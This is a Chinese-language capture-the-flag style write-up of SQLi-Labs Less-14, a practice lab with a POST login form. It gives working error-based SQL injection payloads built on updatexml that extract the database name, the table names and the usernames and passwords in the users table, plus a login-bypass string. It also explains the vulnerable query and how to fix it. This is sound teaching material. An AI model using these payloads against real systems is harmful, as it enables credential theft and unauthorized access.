# SQLi-Labs | Less-14 POST 双引号 注入 报错注入
## 一、漏洞简介
POST登录表单注入，用户名参数被双引号包裹，闭合符号为 `"`。页面不展示查询结果，但是会打印SQL报错信息，使用updatexml报错注入脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-14/
注入类型：POST、字符型、"闭合、报错注入
## 三、复现步骤
1. BP抓包，获取POST参数uname、passwd。
2. 测试闭合：uname填入 `admin"`，提交，页面报错，确认双引号闭合。
3. 测试注释：uname填入 `admin" --+`，密码随便填，成功登录，验证闭合+注释生效。
4. 构造updatexml报错注入payload，填入uname，提交，通过报错带出数据。
## 四、Payload
获取库名：
`uname=" and updatexml(1,concat(0x7e,database(),0x7e),1) --+ & passwd=1`
获取表名：
`uname=" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+ & passwd=1`
获取users表账号密码：
`uname=" and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+ & passwd=1`
绕过登录：
`uname=admin" --+ & passwd=123`
## 五、漏洞原理
后端SQL语句：
`SELECT * FROM users WHERE username="$uname" AND password="$passwd"`
uname参数直接拼接，没有过滤和预编译。双引号可以闭合前面的字符串，插入恶意SQL。开启错误回显，利用updatexml报错带出查询内容。
## 六、修复方案
1. 使用预编译参数绑定，杜绝SQL拼接。
2. 关闭详细数据库错误输出。
3. 输入层过滤危险符号、SQL关键字。
## 七、总结
Less14和Less13逻辑几乎一致，只是闭合符号由 `')` 换成了双引号 `"`，同样依靠报错注入拿数据，没有正常结果回显。